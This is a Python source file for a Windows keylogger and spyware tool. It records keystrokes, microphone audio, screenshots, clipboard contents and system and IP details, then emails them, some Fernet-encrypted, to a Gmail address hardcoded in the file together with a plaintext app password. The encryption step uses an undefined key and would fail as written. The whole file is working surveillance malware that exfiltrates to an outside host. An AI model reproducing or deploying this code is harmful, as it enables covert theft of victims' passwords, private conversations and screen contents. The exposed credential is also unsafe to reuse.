# logging keys
from pynput.keyboard import Key, Listener

# Email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# computer info
import socket
import platform

# clipboard
import win32clipboard

# microphone
from scipy.io.wavfile import write
import sounddevice as sd

# screenshot
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# cryptography
from cryptography.fernet import Fernet

# other libraries
import time
import os

import getpass
from requests import get

key_info = "key_log.txt"
sys_info = "system_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"

e_keys = "e_key_log.txt"
e_sys_info = "e_sysInfo.txt"
e_clipboard_info = "e_clipboard.txt"

mic_time = 10

time_iteration = 15
number_of_iterations_end = 3 

email_addr = "divkirnapure7@gmail.com"
password = "uqrlxmkvoncsccru"

toaddr = "divkirnapure7@gmail.com"

username = getpass.getuser()

file_path = f"C:\\Users\\{username}\\pylogger"
os.makedirs(file_path, exist_ok=True)

extend = "\\"
file_merge = file_path + extend


# adding email functionality

def send_email(filename, attachment_path, toaddr):
    fromaddr = email_addr

    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Log File"

    body = "Please find the attached log file."
    msg.attach(MIMEText(body, "plain"))

    # Attachment
    if not os.path.exists(attachment_path):
        print("Attachment not found!")
        return

    with open(attachment_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f'attachment; filename="{filename}"'
    )

    msg.attach(part)

    # SMTP
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(fromaddr, password)  # APP PASSWORD ONLY
        server.sendmail(fromaddr, toaddr, msg.as_string())
        server.quit()
        print("Email sent successfully")

    except smtplib.SMTPAuthenticationError:
        print("Authentication failed. Check App Password.")
    except Exception as e:
        print("Error sending email:", e)

send_email(
    filename=key_info,
    attachment_path=file_path + extend + key_info,
    toaddr=toaddr
)


# getting computer information

def computer_info():
    with open(file_path + extend + sys_info , "a") as f:
        hostname = socket.gethostname()
        IPaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("public IP address: "+ public_ip)

        except Exception:
            f.write("couldn't get public IP address.")

        f.write("processor: "+ (platform.processor()) + "\n")
        f.write("system: "+ platform.system() + " " + platform.version() + "\n")
        f.write("machine: "+ platform.machine() + "\n")
        f.write("host Name: "+ hostname + "\n")
        f.write("private IP: "+ IPaddr + "\n")

computer_info()

# gathering text from clipboard

def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard data: \n" + data)

        except:
            f.write("the clipboard could not be copied.")

copy_clipboard()

# recording audio information

def microphone():
    fs = 44100
    seconds = mic_time

    my_recording = sd.rec(int(seconds * fs), samplerate= fs, channels= 2)
    sd.wait()
    print("recording finished")

    write(file_path + extend + audio_info, fs , my_recording)


microphone()

# capturing screenshot

def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_info)
    print("Screen Captured.")

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration


# creating keylogger

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + key_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()

                elif k.find("key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        try:
            if key == Key.esc:
                print("Exiting...")
                return False
            
            if currentTime > stoppingTime:
                return False
        
        except AttributeError:
            pass
        
    with Listener(on_press= on_press, on_release= on_release) as listner:
        listner.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + key_info, "w") as f:
            f.write(" ")

        
        screenshot()
        send_email(
            filename=screenshot_info,
            attachment_path=file_path + extend + screenshot_info,
            toaddr=toaddr
        )

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration


# encrypting files 

files_to_encrypt = [file_merge + sys_info, file_merge + clipboard_info, file_merge + key_info]
encrypted_file_names = [file_merge + e_sys_info, file_merge + e_clipboard_info, file_merge + e_keys]

file_count = 0

for file in files_to_encrypt:

    with open(files_to_encrypt[file_count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[file_count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[file_count], encrypted_file_names[file_count], toaddr)
    file_count += 1

time.sleep(120)